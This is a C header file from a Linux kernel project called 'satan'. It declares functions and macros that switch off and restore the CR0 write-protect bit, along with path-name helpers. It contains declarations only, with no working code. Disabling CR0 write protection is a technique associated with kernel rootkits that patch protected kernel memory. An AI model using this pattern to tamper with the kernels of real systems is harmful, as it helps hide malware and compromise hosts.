// Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
#ifndef SATAN_UTIL_H_
#define SATAN_UTIL_H_

#include <linux/types.h>


void satan_cr0_wp_disable(void);
void satan_cr0_wp_enable(void);
#define CR0_WP_DISABLE     satan_cr0_wp_disable();
#define CR0_WP_DISABLE_END satan_cr0_wp_enable();

void satan_basename(const char *path, char *buf, size_t buf_size);
void satan_filename(const char *path, char *buf, size_t buf_size);

#endif  // SATAN_UTIL_H_
